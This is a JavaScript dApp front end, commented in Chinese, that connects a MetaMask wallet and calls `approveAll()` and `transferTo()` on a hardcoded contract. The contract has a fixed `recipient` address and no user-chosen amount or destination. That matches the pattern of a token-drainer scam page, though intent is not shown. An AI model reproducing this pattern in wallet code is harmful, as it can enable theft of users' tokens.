const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 替换为你的合约地址
const abi = [
	{
		"inputs": [],
		"name": "approveAll",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "transferTo",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_tokenAddress",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "recipient",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "token",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

let provider;
let signer;
let contract;

document.getElementById('connectWallet').onclick = async () => {
    try {
        // 检查浏览器是否支持 MetaMask (window.ethereum)
        if (window.ethereum) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []); // 请求连接钱包
            signer = provider.getSigner();
            const account = await signer.getAddress();
            
            // 显示连接成功后的地址
            document.getElementById('walletAddress').textContent = `已连接: ${account}`;
            
            // 与智能合约实例化
            contract = new ethers.Contract(contractAddress, abi, signer);
            console.log("钱包已连接，地址:", account);
        } else {
            alert("请安装MetaMask!");
        }
    } catch (error) {
        console.error("连接钱包时出错:", error);
        document.getElementById('walletAddress').textContent = '连接失败，请重试';
    }
};

document.getElementById('approveAll').onclick = async () => {
    try {
        if (!contract) {
            alert("请先连接钱包！");
            return;
        }
        const tx = await contract.approveAll();
        document.getElementById('statusMessage').textContent = '授权进行中...';
        await tx.wait();
        document.getElementById('statusMessage').textContent = '授权成功!';
    } catch (error) {
        console.error("授权失败:", error);
        document.getElementById('statusMessage').textContent = '授权失败!';
    }
};

document.getElementById('transferTokens').onclick = async () => {
    try {
        if (!contract) {
            alert("请先连接钱包！");
            return;
        }
        const tx = await contract.transferTo();
        document.getElementById('statusMessage').textContent = '转移进行中...';
        await tx.wait();
        document.getElementById('statusMessage').textContent = '转移成功!';
    } catch (error) {
        console.error("转移失败:", error);
        document.getElementById('statusMessage').textContent = '转移失败!';
    }
};
